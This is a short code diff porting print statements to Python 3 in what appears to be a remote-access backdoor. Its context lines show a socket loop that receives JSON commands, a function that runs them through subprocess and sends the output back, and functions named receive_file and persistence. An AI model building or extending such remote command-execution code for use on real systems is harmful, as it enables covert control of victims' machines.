@@ -124,7 +124,7 @@ def receive_file(cmd_data):
 def run_shell_command(cmd_data):
 	try:
 		full_input = cmd_data['cmd'] + " " + cmd_data['args'].rstrip()
-		print full_input.split()
+		print(full_input.split())
 		result = subprocess.check_output(full_input.split())
 		if result:
 			sock.send(result)
@@ -153,7 +153,7 @@ def persistence(cmd_data):
 # SETUP
 while 1:
 	raw_data = sock.recv(512)
-	print raw_data
+	print(raw_data)
 	cmd_data = json.loads(raw_data)
 	cmd = cmd_data['cmd']
 
